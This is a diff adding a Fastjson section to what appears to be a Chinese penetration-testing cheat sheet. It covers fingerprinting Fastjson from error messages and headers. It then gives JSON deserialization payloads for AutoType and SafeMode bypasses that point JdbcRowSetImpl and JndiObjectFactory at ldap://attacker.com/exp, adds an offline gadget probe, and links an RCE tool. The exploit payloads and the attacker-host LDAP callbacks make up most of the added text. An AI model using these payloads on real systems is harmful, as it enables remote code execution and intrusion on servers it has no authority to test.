@@ -331,6 +331,48 @@ Actuator信息泄露
 
 Fastjson
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ 探测目标是否使用Fastjson
+	- HTTP请求特征
+		::
+		
+			修改请求头：Content-Type: application/json
+			观察响应是否包含Fastjson特有错误（如"syntax error"后出现com.alibaba.fastjson.JSON）
+			故意发送畸形JSON数据（如{"@type":"x）→ 若返回错误包含autoType is not support等字样可确认
+	- 响应特征
+		+ 响应头包含X-Powered-By: Fastjson
+		+ 错误页面泄露版本号（如at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(...)）
++ 利用检测
+	- AutoType绕过检测
+		::
+		
+			{
+			  "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
+			  "dataSourceName":"ldap://attacker.com/exp",
+			  "autoCommit":true
+			}
+			观察结果：
+			若目标向attacker.com发起LDAP请求 → 存在AutoType绕过漏洞
+			使用DNSLog平台（如ceye.io）确认外联行为
+	- SafeMode绕过检测
+		::
+		
+			{
+			  "@type":"org.apache.shiro.jndi.JndiObjectFactory",
+			  "resourceName":"ldap://attacker.com/exp"
+			}
+			适用于≥1.2.68版本且未启用SafeMode
+			依赖目标环境是否存在兼容的Gadget链（如Shiro、Tomcat依赖）
+	- 不出网检测（内部利用）
+		::
+		
+			{
+			  "@type":"com.alibaba.fastjson.JSONObject",
+			  "x":{
+				"@type":"java.lang.Exception",
+				"@type":"org.springframework.core.NestedIOException"
+			  }
+			}
+			观察响应延迟或堆栈信息变化 → 判断是否存在可利用的Gadget链
 + 利用工具
 	- Fastjson_rce_tool
 		+ 地址：``https://github.com/wyzxxz/fastjson_rce_tool``
